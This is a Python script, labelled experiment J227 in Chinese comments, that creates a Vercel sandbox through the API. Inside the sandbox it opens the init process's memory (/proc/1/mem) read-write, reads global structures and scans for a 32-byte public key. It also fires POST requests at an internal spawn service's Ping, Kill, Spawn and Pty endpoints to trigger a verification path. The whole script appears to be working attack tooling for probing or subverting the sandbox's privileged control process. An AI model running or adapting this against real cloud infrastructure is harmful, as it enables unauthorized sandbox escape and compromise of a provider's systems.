# 实验J227: POST触发verify后 扫描pub32 + 观察0xe9e610懒加载
# 后台进程发POST(会被杀), 独立进程读内存扫描
import json, time, urllib.request, urllib.error, sys
try:
    sys.stdout.reconfigure(encoding='utf-8', errors='replace')
except Exception:
    pass

TOKEN = "vcp_REDACTED_PLACEHOLDER"
TEAM = "team_GIy1SZ444lspqeNbh4r8uAUg"
PROJ = "prj_iyw2xfjP3RKPT7n8b8c1tBIxxK5F"

def api(method, path, body=None, timeout=300):
    req = urllib.request.Request(f"https://api.vercel.com{path}", method=method)
    req.add_header("Authorization", f"Bearer {TOKEN}")
    req.add_header("Content-Type", "application/json")
    data = json.dumps(body).encode() if body is not None else None
    try:
        with urllib.request.urlopen(req, data=data, timeout=timeout) as r:
            return r.status, r.read().decode()
    except urllib.error.HTTPError as e:
        return e.code, e.read().decode()[:600]
    except Exception as e:
        return -1, f"EXC {type(e).__name__}: {e}"

def run_cmd(sid, code, label, wait=True, timeout=280):
    body = {"command": "python3", "args": ["-c", code],
            "wait": wait, "logs": True, "timeout": timeout}
    for attempt in range(4):
        c, r = api("POST", f"/v2/sandboxes/sessions/{sid}/cmd?teamId={TEAM}", body)
        if c == 200:
            break
        print(f"  retry[{attempt}] status {c}: {r[:150]}", flush=True)
        if c == 410 or "sandbox_stopped" in r:
            print(f"  SANDBOX_DEAD at cmd[{label}]", flush=True)
            return "DEAD"
        time.sleep(3)
    print(f"=== cmd[{label}] status {c} ===", flush=True)
    if c != 200:
        print(f"  RAW: {r[:400]}", flush=True)
        return "DEAD" if "sandbox_stopped" in r else ""
    for line in r.splitlines():
        line = line.strip()
        if not line:
            continue
        try:
            d = json.loads(line)
            if d.get("stream") in ("stdout", "stderr"):
                print(d.get("data", ""), end="", flush=True)
            elif d.get("stream") == "command":
                print("\nEXIT:", d.get("command", {}).get("exitCode"), flush=True)
        except Exception:
            print(line[:400], flush=True)
    return ""

def bashfile(sid, cmd, label, n=40000):
    c, r = api("POST", f"/v2/sandboxes/sessions/{sid}/cmd?teamId={TEAM}",
               {"command": "bash", "args": ["-c", cmd], "wait": True, "logs": True, "timeout": 120})
    print(f"=== {label} status {c} ===", flush=True)
    print(r[:n], flush=True)
    return c

NAME = "expj227"
api("DELETE", f"/v2/sandboxes/{NAME}?teamId={TEAM}&projectId={PROJ}")
c, r = api("POST", f"/v2/sandboxes?teamId={TEAM}",
           {"projectId": PROJ, "name": NAME})
print("create:", c, flush=True)
if c != 200:
    print(r[:400], flush=True)
    sys.exit(1)
sid = json.loads(r)["sandbox"]["currentSessionId"]
print("sid:", sid, flush=True)

READER = r'''
import os, struct
fd = os.open("/proc/1/mem", os.O_RDWR)
def ra(a, n):
    os.lseek(fd, a, 0)
    return os.read(fd, n)
PUB = bytes.fromhex("9cab29062e6d040002c3cbc8ad4be45e392ff7009cc1baa7645feed3b7105c7e")
# 读全局
for g in (0xe9e010, 0xe9e610, 0xe9f060, 0xe9f140):
    try:
        b = ra(g, 0x18)
        ptr, ln, cap = struct.unpack_from("<QQQ", b)
        print("G", hex(g), "ptr", hex(ptr), "len", ln, "cap", cap, flush=True)
        if ptr and 0x10000 < ptr < 0x800000000000 and 0 < ln <= 0x100:
            print("G_OBJ", hex(g), ra(ptr, ln).hex(), flush=True)
    except Exception as e:
        print("G_ERR", hex(g), repr(e), flush=True)
# 扫 rw 段找 pub32
maps = open("/proc/1/maps").read()
hits = 0
for ln in maps.splitlines():
    rng, perm, off, dev, ino, *rest = ln.split()
    if "rw" not in perm:
        continue
    lo, hi = (int(x, 16) for x in rng.split("-"))
    if hi - lo < 0x4000:
        continue
    a = lo
    while a < hi:
        n = min(0x400000, hi - a)
        try:
            b = ra(a, n)
        except OSError:
            a += n
            continue
        pos = 0
        while True:
            i = b.find(PUB, pos)
            if i < 0:
                break
            hits += 1
            print("HIT", hex(a + i), flush=True)
            pos = i + 1
        a += n
print("HITS", hits, flush=True)
os.close(fd)
print("READ_DONE", flush=True)
'''

# 阶段0: 触发前基线
bashfile(sid, "python3 -c '" + READER.replace("'", "'\\''") + "'", "BEFORE", 6000)

# 阶段1: 后台POST触发verify (进程被杀无妨) + 独立读内存
POSTER = "(python3 -c 'import urllib.request; urllib.request.urlopen(\"http://127.0.0.1:30001/vercel.sandbox.spawn.v1.SpawnService/Ping\", data=b\"{}\", timeout=5)' &) ; sleep 2 ; python3 -c '"
bashfile(sid, POSTER + READER.replace("'", "'\\''") + "'", "AFTER_POST", 8000)

# 阶段2: 多个不同POST (路径/方法/头) 再观察
POSTER2 = "(for p in /vercel.sandbox.spawn.v1.SpawnService/Kill /vercel.sandbox.spawn.v1.SpawnService/Spawn /vercel.sandbox.spawn.v1.SpawnService/Pty; do python3 -c 'import urllib.request; urllib.request.urlopen(\"http://127.0.0.1:30001\"+str(\"$p\"), data=b\"{}\", timeout=5)' & done) ; sleep 3 ; python3 -c '"
bashfile(sid, POSTER2 + READER.replace("'", "'\\''") + "'", "AFTER_MULTI", 8000)

api("DELETE", f"/v2/sandboxes/{NAME}?teamId={TEAM}&projectId={PROJ}")
print("\ncleanup done", flush=True)
